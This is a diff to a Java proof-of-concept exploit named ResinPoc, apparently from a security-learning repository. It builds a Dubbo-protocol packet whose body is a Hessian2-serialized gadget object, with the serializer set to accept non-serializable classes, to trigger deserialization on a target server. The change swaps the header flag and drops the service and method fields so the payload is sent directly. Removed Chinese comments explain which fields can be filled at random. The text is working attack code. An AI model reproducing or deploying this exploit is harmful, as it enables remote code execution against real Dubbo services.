@@ -63,52 +63,26 @@ public class ResinPoc {
       // set magic number.
       Bytes.short2bytes((short) 0xdabb, header);
       // set request and serialization flag.
-      header[2] = (byte) ((byte) 0x80 | 2);
+      header[2] = (byte) ((byte) 0x20 | 2);
 
       // set request id.
       Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
 
       ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
-      ByteArrayOutputStream hessian2ByteArrayOutputStream2 = new ByteArrayOutputStream();
-      ByteArrayOutputStream hessian2ByteArrayOutputStream3 = new ByteArrayOutputStream();
       Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
-      Hessian2Output out2 = new Hessian2Output(hessian2ByteArrayOutputStream2);
-      Hessian2Output out3 = new Hessian2Output(hessian2ByteArrayOutputStream3);
       NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
       sf.setAllowNonSerializable(true);
-      out2.setSerializerFactory(sf);
+      out.setSerializerFactory(sf);
 
-      //todo 经测试，以下4个随意填
-      //注册中心获取到的service全限定名、版本号、方法名
-      out.writeString("2.0.2");
-      out.writeString("com.threedr3am.learn.server.boot.DemoService");
-      out.writeString("1.0");
-      out.writeString("hello");
-      //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
-      out.writeString("Ljava/util/Map;");
+      out.writeObject(o);
       out.flushBuffer();
       if (out instanceof Cleanable) {
         ((Cleanable) out).cleanup();
       }
 
-      out2.writeObject(o);
-      out2.flushBuffer();
-      if (out2 instanceof Cleanable) {
-        ((Cleanable) out2).cleanup();
-      }
-
-      out3.writeObject(new HashMap());
-      out3.flushBuffer();
-      if (out3 instanceof Cleanable) {
-        ((Cleanable) out3).cleanup();
-      }
-
-      Bytes.int2bytes(hessian2ByteArrayOutputStream.size() + hessian2ByteArrayOutputStream2.size()
-          + hessian2ByteArrayOutputStream3.size(), header, 12);
+      Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
       byteArrayOutputStream.write(header);
       byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
-      byteArrayOutputStream.write(hessian2ByteArrayOutputStream2.toByteArray());
-      byteArrayOutputStream.write(hessian2ByteArrayOutputStream3.toByteArray());
 
       byte[] bytes = byteArrayOutputStream.toByteArray();
 
